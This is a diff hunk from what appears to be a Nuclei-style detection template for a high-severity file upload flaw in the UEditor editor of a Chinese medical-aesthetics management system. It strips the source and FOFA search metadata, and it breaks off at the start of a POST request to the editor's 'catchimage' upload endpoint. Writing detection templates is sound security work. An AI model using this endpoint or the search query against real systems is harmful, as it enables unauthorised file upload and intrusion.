@@ -3,12 +3,8 @@ info:
   name: 宏脉医美行业管理系统UEditor编辑器存在文件上传漏洞_bk9r3z0u4k2g9w1u
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: file-upload,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: title="宏脉医美行业管理系统"
 http:
 - raw:
   - 'POST /content/Js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
